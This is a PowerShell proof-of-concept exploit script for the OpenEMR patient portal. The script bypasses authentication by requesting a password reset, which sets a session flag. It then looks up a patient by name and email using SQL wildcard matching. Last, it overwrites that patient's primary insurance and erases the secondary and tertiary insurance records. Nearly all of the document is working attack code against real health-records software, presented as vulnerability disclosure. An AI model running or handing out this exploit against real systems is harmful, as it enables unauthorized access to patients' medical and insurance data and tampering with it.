#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Identify vulnerability in OpenEMR patient portal where insurance information for a specified        #
#           patient can be altered.  This script will replace the primary insurance and detele the information  #
#           of the secondary and tertiary insurances on file.                                                   #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################

#Set proxy if needed (Fiddler users http://localhost:8888)
$proxy = $null #"http://localhost:8888"
$startTime = Get-Date
$id = $null
$requestCount = 0

#Get the server fqdn
if (!$fqdn) {
    $fqdn = Read-Host -Prompt "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

#Start a session by requesting a password reset without logging in
#This activates the error handling logic in index.php which sets $_SESSION['register']=true
#when register session variable is true, authentication is bypassed for the patient portal API
$null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy
$requestCount++
#Alternatively, if the self registration function is enabled, we can start that session to achieve
#the same result of a register session variable set to true.
#$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'
if (!$session) {
    Write-Host "A session could not be established.  Check the connection settings."
    exit
}

$id = Read-Host -Prompt "Enter the Patient ID, if unkown leave blank"

#If no ID is specified, request patient info and lookup
while (!$id) {
    #Get the patient's email
    $email = Read-Host -Prompt "Enter the email address (SQL LIKE syntax allowed for partial matches)"

    #Get the patient's first name
    $first = Read-Host -Prompt "Enter the First Name (SQL LIKE syntax allowed for partial matches)"
    
    #Get the patient's last name
    $last = Read-Host -Prompt "Enter the Last Name (SQL Like syntax allowed for partial matches)"

    #Check if the patient exists
    $response = Invoke-WebRequest -URI "$fqdn/portal/account/account.php?action=get_newpid&value=&last=$($last)&first=$($first)&email=$($email)&dob=%" -WebSession $session -Proxy $proxy
    $requestCount++

    if ($response.Content -like "This account already exists*") {    
        $id = $response.Content.Substring($response.Content.Length - ($response.Content.Length - $response.Content.LastIndexOf(" ") - 1))
        Write-Host "Patient account exists with an id of $id."
    } else {
        Write-Host "Could not find a patient matching those details.  Retrying."
    }
}

#Set Primary Insurance Information
$body = @{
    provider = Read-Host -Prompt "Enter the Insurance Provider Name"
    plan_name = Read-Host -Prompt "Enter the Plan Name"
    policy_number = Read-Host -Prompt "Enter the Policy Number"
    group_number = Read-Host -Prompt "Enter the Group Number"
    date = Read-Host -Prompt "Enter the Plan Effective Date (yyyy-MM-dd)"
    copay = Read-Host -Prompt "Enter the Copay Amount (9.99)"
}

$response = Invoke-WebRequest -URI "$fqdn/portal/account/account.php?action=new_insurance&pid=$id" -Body $body -WebSession $session -Method 'POST' -Proxy $proxy
$requestCount++

Write-Host ""
Write-Host "Patient information Updated"
Write-Host "Time Elapsed $(((Get-Date)-$startTime)), $requestCount requests were made."
Write-Host ""